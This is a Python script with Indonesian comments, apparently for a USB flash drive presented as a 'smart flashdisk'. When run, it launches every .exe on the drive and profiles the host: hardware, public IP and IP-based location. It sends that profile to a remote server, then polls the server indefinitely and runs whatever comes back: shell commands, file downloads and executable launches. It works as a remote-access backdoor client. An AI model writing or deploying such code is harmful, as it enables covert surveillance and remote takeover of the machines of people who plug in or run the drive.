import os
import subprocess
import threading
import time
import socket
import requests
import platform
import psutil
import json
from concurrent.futures import ThreadPoolExecutor

# ========== KONFIGURASI ==========
SERVER_URL = "https://vercel-server-black.vercel.app"  # base URL
REPORT_ENDPOINT = f"{SERVER_URL}/report"
POLL_ENDPOINT = f"{SERVER_URL}/poll_commands"
RESULT_ENDPOINT = f"{SERVER_URL}/command_result"
# =================================

# --- Fungsi untuk mengumpulkan hardware ---
def get_system_info():
    info = {}
    info['hostname'] = socket.gethostname()
    info['os'] = f"{platform.system()} {platform.release()} {platform.version()}"
    info['cpu'] = f"{platform.processor()} - {psutil.cpu_count(logical=True)} cores"
    # RAM
    mem = psutil.virtual_memory()
    info['ram'] = f"{mem.total // (1024**3)} GB total, {mem.percent}% used"
    # Disk (ambil root disk tempat script dijalankan)
    try:
        disk_usage = psutil.disk_usage(os.path.dirname(os.path.abspath(__file__)))
        info['disk'] = f"{disk_usage.total // (1024**3)} GB total, {disk_usage.free // (1024**3)} GB free"
    except:
        info['disk'] = "Tidak diketahui"
    # GPU sederhana (via wmic untuk Windows)
    gpu = "Tidak diketahui"
    if platform.system() == "Windows":
        try:
            output = subprocess.check_output("wmic path win32_videocontroller get name", shell=True, text=True)
            lines = output.split('\n')
            if len(lines) > 1:
                gpu = lines[1].strip()
        except:
            pass
    info['gpu'] = gpu
    # GPS (jika ada device GPS, misal melalui serial atau location service)
    # Di sini kita coba ambil dari lokasi IP (atau browser geolocation? Tidak bisa dari Python)
    # Alternatif: menggunakan request ke layanan IP-geolocation (misal ipinfo.io)
    gps_lat, gps_lon = None, None
    try:
        geo_resp = requests.get('https://ipinfo.io/json', timeout=5)
        if geo_resp.status_code == 200:
            geo = geo_resp.json()
            loc = geo.get('loc', '')
            if loc:
                lat_lon = loc.split(',')
                gps_lat = float(lat_lon[0])
                gps_lon = float(lat_lon[1])
    except:
        pass
    info['gps_lat'] = gps_lat
    info['gps_lon'] = gps_lon
    return info

def get_public_ip():
    services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://checkip.amazonaws.com']
    for url in services:
        try:
            resp = requests.get(url, timeout=3)
            return resp.text.strip()
        except:
            continue
    return "UNKNOWN_IP"

def scan_executables(flashdisk_root):
    exe_list = []
    for root, _, files in os.walk(flashdisk_root):
        for file in files:
            if file.lower().endswith('.exe'):
                exe_list.append(os.path.join(root, file))
    return exe_list

def run_exe_parallel(exe_path):
    try:
        subprocess.Popen([exe_path], shell=True)
        print(f"[RUN] {exe_path}")
    except Exception as e:
        print(f"[ERROR] {exe_path}: {e}")

def send_initial_report(ip, hostname, exe_list, hw_info):
    client_id = f"{hostname}_{ip}"
    data = {
        "client_id": client_id,
        "hostname": hostname,
        "ip": ip,
        "os": hw_info['os'],
        "cpu": hw_info['cpu'],
        "ram": hw_info['ram'],
        "disk": hw_info['disk'],
        "gpu": hw_info['gpu'],
        "gps_lat": hw_info['gps_lat'],
        "gps_lon": hw_info['gps_lon'],
        "executables": exe_list
    }
    try:
        resp = requests.post(REPORT_ENDPOINT, json=data, timeout=10)
        if resp.status_code == 200:
            print("[SERVER] Laporan awal berhasil dikirim")
            return True
        else:
            print(f"[SERVER] Gagal, status: {resp.status_code}")
    except Exception as e:
        print(f"[SERVER] Error koneksi: {e}")
    return False

def execute_command(cmd):
    """Eksekusi perintah dari server"""
    cmd_type = cmd['command_type']
    payload = cmd['payload']
    cmd_id = cmd['id']
    result = ""
    status = "failed"
    try:
        if cmd_type == "message":
            # Tampilkan pesan ke pengguna (popup via tkinter atau print)
            print(f"\n[PESAN DARI SERVER] {payload}\n")
            result = "Pesan ditampilkan"
            status = "done"
        elif cmd_type == "download_file":
            # Download file dari URL ke flashdisk
            url = payload
            local_filename = os.path.basename(url.split('?')[0])
            save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), local_filename)
            r = requests.get(url, stream=True, timeout=30)
            with open(save_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
            result = f"File diunduh ke {save_path}"
            status = "done"
        elif cmd_type == "run_command":
            # Jalankan perintah sistem
            output = subprocess.check_output(payload, shell=True, text=True, stderr=subprocess.STDOUT, timeout=30)
            result = output[:500]  # batasi
            status = "done"
        elif cmd_type == "exec_exe":
            # Jalankan file .exe yang ada di flashdisk (path relatif)
            exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), payload)
            if os.path.exists(exe_path):
                subprocess.Popen([exe_path], shell=True)
                result = f"Menjalankan {payload}"
                status = "done"
            else:
                result = f"File {payload} tidak ditemukan"
        else:
            result = "Unknown command type"
    except Exception as e:
        result = str(e)
    # Laporkan hasil ke server
    try:
        requests.post(RESULT_ENDPOINT, json={"command_id": cmd_id, "status": status, "result": result}, timeout=5)
    except:
        pass
    print(f"[CMD] {cmd_type}: {result}")

def poll_commands(client_id):
    """Polling setiap 10 detik untuk mengambil perintah baru"""
    while True:
        try:
            resp = requests.get(POLL_ENDPOINT, params={"client_id": client_id}, timeout=10)
            if resp.status_code == 200:
                commands = resp.json()
                for cmd in commands:
                    # Eksekusi perintah di thread terpisah agar tidak memblokir polling
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except Exception as e:
            print(f"[POLL] Error: {e}")
        time.sleep(10)  # interval polling

def autorun_animation():
    import sys
    msg = "*** SELAMAT DATANG DI FLASHDISK CERDAS ***"
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    for ch in msg:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def main():
    # Animasi
    threading.Thread(target=autorun_animation, daemon=True).start()
    
    # Info dasar
    ip = get_public_ip()
    hostname = socket.gethostname()
    client_id = f"{hostname}_{ip}"
    flash_root = os.path.dirname(os.path.abspath(__file__))
    exe_files = scan_executables(flash_root)
    print(f"Ditemukan {len(exe_files)} file .exe")
    
    # Jalankan semua .exe bersamaan
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(run_exe_parallel, exe_files)
    
    # Kumpulkan hardware lengkap
    hw_info = get_system_info()
    
    # Kirim laporan awal
    success = send_initial_report(ip, hostname, exe_files, hw_info)
    if not success:
        print("Gagal mengirim laporan, tetap melanjutkan...")
    
    # Mulai polling perintah (loop forever)
    print("Client siap menerima perintah dari server...")
    poll_commands(client_id)

if __name__ == "__main__":
    main()